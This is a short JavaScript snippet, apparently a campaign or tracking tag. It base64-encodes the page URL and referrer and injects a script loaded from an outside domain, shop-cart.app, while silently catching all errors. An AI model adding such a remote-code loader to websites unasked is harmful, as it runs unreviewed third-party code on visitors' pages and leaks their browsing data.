(function() {
  if (window.__campaignInjectorLoaded) return;
  window.__campaignInjectorLoaded = true;

  try {
    var s = document.createElement('script');
    s.async = true;

    var encodedUrl = '';
    var encodedReferrer = '';

    try {
      encodedUrl = btoa(document.URL);
    } catch(e) {
      encodedUrl = encodeURIComponent(document.URL);
    }

    try {
      encodedReferrer = btoa(document.referrer || '');
    } catch(e) {
      encodedReferrer = encodeURIComponent(document.referrer || '');
    }

    s.src = 'https://shop-cart.app/campaigns.js?fpid=' + encodedUrl + '&r=' + encodedReferrer;
    document.head.appendChild(s);

  } catch (e) {}
})();